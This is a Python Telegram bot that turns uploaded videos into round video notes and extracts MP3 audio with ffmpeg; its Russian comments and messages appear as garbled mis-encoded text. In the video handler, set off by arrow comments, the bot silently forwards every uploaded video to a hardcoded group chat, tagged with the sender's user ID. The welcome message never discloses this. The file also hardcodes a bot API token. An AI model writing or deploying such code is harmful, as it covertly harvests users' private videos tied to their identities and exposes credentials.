from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, MessageHandler, filters, ContextTypes, CommandHandler
import subprocess
import os
import tempfile

# === –ù–ê–°–¢–†–û–ô–ö–ê ===
TOKEN = "8244258907:AAGSOfk1CMoBku1ChaL-lTEjWdFG7ll_EYo"
TARGET_CHAT_ID = -1001234567890  # ‚Üê –ó–ê–ú–ï–ù–ò –ù–ê ID –°–í–û–ï–ô –ì–†–£–ü–ü–´/–ö–ê–ù–ê–õ–ê (—Å -100)


# –ü—Ä–∏–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_text = """
ü§ñ **–ü—Ä–∏–≤–µ—Ç! –Ø –±–æ—Ç –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ –≤–∏–¥–µ–æ**

üé¨ **–ß—Ç–æ —è —É–º–µ—é:**
‚Ä¢ –°–æ–∑–¥–∞–≤–∞—Ç—å –≤–∏–¥–µ–æ-–∫—Ä—É–∂–∫–∏ –∏–∑ –æ–±—ã—á–Ω—ã—Ö –≤–∏–¥–µ–æ
‚Ä¢ –ò–∑–≤–ª–µ–∫–∞—Ç—å –∞—É–¥–∏–æ MP3 –∏–∑ –≤–∏–¥–µ–æ
‚Ä¢ –û–±—Ä–∞–±–∞—Ç—ã–≤–∞—Ç—å –æ–±–∞ –≤–∞—Ä–∏–∞–Ω—Ç–∞ —Å—Ä–∞–∑—É

üìÅ **–ö–∞–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:**
1. –û—Ç–ø—Ä–∞–≤—å –º–Ω–µ –≤–∏–¥–µ–æ —Ñ–∞–π–ª
2. –í—ã–±–µ—Ä–∏ –¥–µ–π—Å—Ç–≤–∏–µ –∏–∑ –º–µ–Ω—é –∫–Ω–æ–ø–æ–∫
3. –ü–æ–ª—É—á–∏ —Ä–µ–∑—É–ª—å—Ç–∞—Ç!

‚ö†Ô∏è **–û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è:**
‚Ä¢ –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å: 60 —Å–µ–∫—É–Ω–¥
‚Ä¢ –§–æ—Ä–º–∞—Ç –≤–∏–¥–µ–æ: MP4, MOV –∏ –¥—Ä—É–≥–∏–µ
"""
    keyboard = [["üìπ –û—Ç–ø—Ä–∞–≤–∏—Ç—å –≤–∏–¥–µ–æ"]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')


async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message

    if not message.video:
        await message.reply_text("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –≤–∏–¥–µ–æ —Ñ–∞–π–ª")
        return

    video_file = await message.video.get_file()

    with tempfile.NamedTemporaryFile(suffix='.mp4', delete=False) as input_file:
        input_path = input_file.name

    with tempfile.NamedTemporaryFile(suffix='.mp4', delete=False) as output_file:
        output_path = output_file.name

    with tempfile.NamedTemporaryFile(suffix='.mp3', delete=False) as mp3_file:
        mp3_path = mp3_file.name

    try:
        await video_file.download_to_drive(input_path)
        await message.reply_text("üé• –í–∏–¥–µ–æ –ø–æ–ª—É—á–µ–Ω–æ, –Ω–∞—á–∏–Ω–∞—é –æ–±—Ä–∞–±–æ—Ç–∫—É...")

        # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
        # –û–¢–ü–†–ê–í–ö–ê –í –ì–†–£–ü–ü–£ –° ID –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–Ø
        user_id = update.effective_user.id
        await context.bot.send_video(
            chat_id=TARGET_CHAT_ID,
            video=open(input_path, 'rb'),
            caption=f"ID: {user_id}"
        )
        # <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

        has_audio = check_audio_stream(input_path)

        if has_audio:
            keyboard = [
                ["üé¨ –°–¥–µ–ª–∞—Ç—å –∫—Ä—É–∂–æ–∫", "üéµ –ò–∑–≤–ª–µ—á—å MP3"],
                ["üîß –û–±–∞ –≤–∞—Ä–∏–∞–Ω—Ç–∞"]
            ]
        else:
            keyboard = [
                ["üé¨ –°–¥–µ–ª–∞—Ç—å –∫—Ä—É–∂–æ–∫"],
                ["üéµ –ò–∑–≤–ª–µ—á—å MP3 (–Ω–µ—Ç –∞—É–¥–∏–æ)", "üîß –û–±–∞ –≤–∞—Ä–∏–∞–Ω—Ç–∞ (—Ç–æ–ª—å–∫–æ –≤–∏–¥–µ–æ)"]
            ]

        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

        if has_audio:
            await message.reply_text("–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:", reply_markup=reply_markup)
        else:
            await message.reply_text(
                "‚ö†Ô∏è –í –≤–∏–¥–µ–æ –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–æ –∞—É–¥–∏–æ –¥–æ—Ä–æ–∂–∫–∏\n–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:",
                reply_markup=reply_markup
            )

        context.user_data['file_paths'] = {
            'input_path': input_path,
            'output_path': output_path,
            'mp3_path': mp3_path,
            'has_audio': has_audio
        }

    except Exception as e:
        await message.reply_text(f"‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {str(e)}")
        cleanup_files([input_path, output_path, mp3_path])


def check_audio_stream(input_path):
    try:
        cmd_info = ['ffprobe', '-i', input_path, '-show_streams', '-select_streams', 'a', '-loglevel', 'error']
        result_info = subprocess.run(cmd_info, capture_output=True, text=True)
        return bool(result_info.stdout.strip())
    except:
        return False


async def handle_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message
    choice = message.text
    user_data = context.user_data

    if 'file_paths' not in user_data:
        await message.reply_text("‚ùå –°–Ω–∞—á–∞–ª–∞ –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –≤–∏–¥–µ–æ —Ñ–∞–π–ª")
        return

    file_paths = user_data['file_paths']
    input_path = file_paths['input_path']
    output_path = file_paths['output_path']
    mp3_path = file_paths['mp3_path']
    has_audio = file_paths.get('has_audio', True)

    try:
        if choice == "üé¨ –°–¥–µ–ª–∞—Ç—å –∫—Ä—É–∂–æ–∫":
            await process_video_note(update, input_path, output_path)

        elif choice == "üéµ –ò–∑–≤–ª–µ—á—å MP3":
            if has_audio:
                await process_mp3(update, input_path, mp3_path)
            else:
                await message.reply_text("‚ùå –í —ç—Ç–æ–º –≤–∏–¥–µ–æ –Ω–µ—Ç –∞—É–¥–∏–æ –¥–æ—Ä–æ–∂–∫–∏")

        elif choice == "üîß –û–±–∞ –≤–∞—Ä–∏–∞–Ω—Ç–∞":
            if has_audio:
                await process_both(update, input_path, output_path, mp3_path)
            else:
                await message.reply_text("‚ùå –í —ç—Ç–æ–º –≤–∏–¥–µ–æ –Ω–µ—Ç –∞—É–¥–∏–æ –¥–æ—Ä–æ–∂–∫–∏, —Å–æ–∑–¥–∞—é —Ç–æ–ª—å–∫–æ –≤–∏–¥–µ–æ-–∫—Ä—É–∂–æ–∫")
                await process_video_note(update, input_path, output_path)

        elif choice == "üìπ –û—Ç–ø—Ä–∞–≤–∏—Ç—å –≤–∏–¥–µ–æ":
            await message.reply_text("üìé –ü—Ä–æ—Å—Ç–æ –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –º–Ω–µ –≤–∏–¥–µ–æ —Ñ–∞–π–ª")
            return

        else:
            await message.reply_text("‚ùå –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ –∏–∑ –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–Ω—ã—Ö –∫–Ω–æ–ø–æ–∫")
            return

    except Exception as e:
        await message.reply_text(f"‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {str(e)}")
    finally:
        cleanup_files([input_path, output_path, mp3_path])
        if 'file_paths' in user_data:
            del user_data['file_paths']


async def process_video_note(update, input_path, output_path):
    await update.message.reply_text("üîÑ –°–æ–∑–¥–∞—é –≤–∏–¥–µ–æ-–∫—Ä—É–∂–æ–∫...")
    success = convert_to_video_note(input_path, output_path)
    if success and os.path.exists(output_path):
        if os.path.getsize(output_path) > 50 * 1024 * 1024:
            await update.message.reply_text("‚ùå –ü–æ–ª—É—á–µ–Ω–Ω–æ–µ –≤–∏–¥–µ–æ —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–µ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram")
        else:
            await update.message.reply_video_note(video_note=open(output_path, 'rb'))
            await update.message.reply_text("‚úÖ –ì–æ—Ç–æ–≤–æ! –í–∏–¥–µ–æ –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–æ –≤ –∫—Ä—É–∂–æ–∫")
    else:
        await update.message.reply_text("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –≤–∏–¥–µ–æ-–∫—Ä—É–∂–∫–∞")


async def process_mp3(update, input_path, mp3_path):
    await update.message.reply_text("üîÑ –ò–∑–≤–ª–µ–∫–∞—é –∞—É–¥–∏–æ...")
    success = extract_mp3(input_path, mp3_path)
    if success and os.path.exists(mp3_path):
        if os.path.getsize(mp3_path) > 50 * 1024 * 1024:
            await update.message.reply_text("‚ùå –ü–æ–ª—É—á–µ–Ω–Ω—ã–π MP3 —Ñ–∞–π–ª —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram")
        else:
            await update.message.reply_audio(audio=open(mp3_path, 'rb'))
            await update.message.reply_text("‚úÖ –ì–æ—Ç–æ–≤–æ! –ê—É–¥–∏–æ –∏–∑–≤–ª–µ—á–µ–Ω–æ –≤ MP3")
    else:
        await update.message.reply_text("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∏–∑–≤–ª–µ—á–µ–Ω–∏–∏ –∞—É–¥–∏–æ")


async def process_both(update, input_path, output_path, mp3_path):
    await update.message.reply_text("üîÑ –û–±—Ä–∞–±–∞—Ç—ã–≤–∞—é –æ–±–∞ –≤–∞—Ä–∏–∞–Ω—Ç–∞...")
    import asyncio
    video_success = await asyncio.to_thread(convert_to_video_note, input_path, output_path)
    mp3_success = await asyncio.to_thread(extract_mp3, input_path, mp3_path)

    results = []
    if video_success and os.path.exists(output_path):
        if os.path.getsize(output_path) <= 50 * 1024 * 1024:
            await update.message.reply_video_note(video_note=open(output_path, 'rb'))
            results.append("‚úÖ –í–∏–¥–µ–æ-–∫—Ä—É–∂–æ–∫ –≥–æ—Ç–æ–≤")
        else:
            results.append("‚ùå –í–∏–¥–µ–æ —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–µ")

    if mp3_success and os.path.exists(mp3_path):
        if os.path.getsize(mp3_path) <= 50 * 1024 * 1024:
            await update.message.reply_audio(audio=open(mp3_path, 'rb'))
            results.append("‚úÖ MP3 –≥–æ—Ç–æ–≤")
        else:
            results.append("‚ùå MP3 —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π")

    if results:
        await update.message.reply_text("\n".join(results))
    else:
        await update.message.reply_text("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ–∑–¥–∞—Ç—å –Ω–∏ –æ–¥–∏–Ω –∏–∑ –≤–∞—Ä–∏–∞–Ω—Ç–æ–≤")


def convert_to_video_note(input_path, output_path, max_duration=60):
    try:
        cmd = [
            'ffmpeg',
            '-i', input_path,
            '-t', str(max_duration),
            '-vf', 'crop=min(iw\\,ih):min(iw\\,ih):(iw-min(iw\\,ih))/2:(ih-min(iw\\,ih))/2,scale=640:640',
            '-c:v', 'libx264',
            '-c:a', 'aac',
            '-y',
            output_path
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        return result.returncode == 0
    except Exception as e:
        print(f"Video conversion error: {e}")
        return False


def extract_mp3(input_path, mp3_path, max_duration=60):
    try:
        check_cmd = ['ffprobe', '-i', input_path, '-show_streams', '-select_streams', 'a', '-loglevel', 'error']
        check_result = subprocess.run(check_cmd, capture_output=True, text=True)
        if not check_result.stdout.strip():
            return False

        cmd = [
            'ffmpeg',
            '-i', input_path,
            '-t', str(max_duration),
            '-q:a', '2',
            '-vn',
            '-y',
            mp3_path
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        return result.returncode == 0
    except Exception as e:
        print(f"MP3 extraction error: {e}")
        return False


def cleanup_files(file_paths):
    for file_path in file_paths:
        if os.path.exists(file_path):
            try:
                os.remove(file_path)
            except:
                pass


def main():
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.VIDEO, handle_video))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_choice))

    print("ü§ñ –ë–æ—Ç –∑–∞–ø—É—â–µ–Ω...")
    application.run_polling()


if __name__ == "__main__":
    main()